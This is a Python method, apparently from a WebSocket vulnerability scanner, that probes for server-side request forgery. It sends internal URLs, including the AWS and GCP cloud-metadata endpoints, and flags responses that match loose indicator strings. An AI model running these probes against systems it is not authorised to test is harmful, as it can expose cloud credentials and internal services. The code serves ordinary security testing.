async def test_ssrf_v2(self, ws) -> List[Dict]:
        """Enhanced SSRF testing with OAST"""
        Logger.info("Testing SSRF...")
        
        results = []
        
        # Test internal endpoints
        internal_targets = [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal',  # GCP metadata
            'http://[::1]',
            'http://0.0.0.0',
        ]
        
        for target in internal_targets:
            try:
                msg = json.dumps({"action": "fetch_url", "url": target})
                await ws.send(msg)
                self.messages_sent += 1
                
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=3.0)
                    self.messages_received += 1
                    
                    # Check for SSRF indicators
                    ssrf_indicators = [
                        'connection refused',
                        'timeout',
                        'metadata',
                        'instance-id',
                        'ami-id',
                        'localhost',
                        '127.0.0.1'
                    ]
                    
                    if any(ind.lower() in response.lower() for ind in ssrf_indicators):
                        Logger.vuln(f"SSRF [HIGH]: Internal endpoint accessible")
                        Logger.vuln(f"Target: {target}")
                        
                        self.vulnerabilities.append({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'HIGH',
                            'confidence': 'HIGH',
                            'description': f'SSRF vulnerability - accessed {target}',
                            'payload': target,
                            'response_snippet': response[:200],
                            'recommendation': 'Validate and whitelist allowed URLs'
                        })
                        results.append({'payload': target, 'confidence': 'HIGH'})
                
                except asyncio.TimeoutError:
                    pass
                
                await asyncio.sleep(0.1)
            except Exception as e:
                continue
        
        return results
